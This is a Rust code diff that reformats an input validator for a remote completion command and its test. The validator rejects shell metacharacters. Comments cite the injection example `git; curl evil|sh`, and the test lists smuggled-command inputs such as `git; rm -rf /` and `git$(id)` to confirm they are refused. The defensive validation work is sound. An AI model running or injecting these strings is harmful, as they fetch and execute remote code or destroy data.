@@ -43,13 +43,28 @@ pub fn validate_and_clamp(req: &mut CompletionExecuteRequest) -> Result<(), Stri
     // metacharacters outright: `command: "git; curl evil|sh"` would otherwise
     // run the second statement on the remote host with no quoting at all.
     // Spaces stay legal (`docker compose`-style names are legitimate and inert).
-    if req
-        .command
-        .chars()
-        .any(|character| matches!(character, ';' | '|' | '&' | '$' | '`' | '(' | ')' | '<' | '>' | '\n' | '\r' | '\\' | '"' | '\'' | '\u{0}'))
-    {
+    if req.command.chars().any(|character| {
+        matches!(
+            character,
+            ';' | '|'
+                | '&'
+                | '$'
+                | '`'
+                | '('
+                | ')'
+                | '<'
+                | '>'
+                | '\n'
+                | '\r'
+                | '\\'
+                | '"'
+                | '\''
+                | '\u{0}'
+        )
+    }) {
         return Err(
-            "completion: command must be a plain program name (no shell metacharacters)".to_string(),
+            "completion: command must be a plain program name (no shell metacharacters)"
+                .to_string(),
         );
     }
     if req.args.len() > MAX_ARGS {
@@ -144,7 +159,13 @@ mod tests {
         // `command` 原样拼进远端命令行（只有 args 做 shell_quote），本臂 RPC
         // 可直接触达，所以必须拒绝元字符——否则 `git; curl evil|sh` 会在远端
         // 执行第二条语句。
-        for evil in ["git; rm -rf /", "git|sh", "git$(id)", "git && id", "git`id`"] {
+        for evil in [
+            "git; rm -rf /",
+            "git|sh",
+            "git$(id)",
+            "git && id",
+            "git`id`",
+        ] {
             let mut req = request("completion-generator", evil, &[]);
             assert!(
                 validate_and_clamp(&mut req).is_err(),
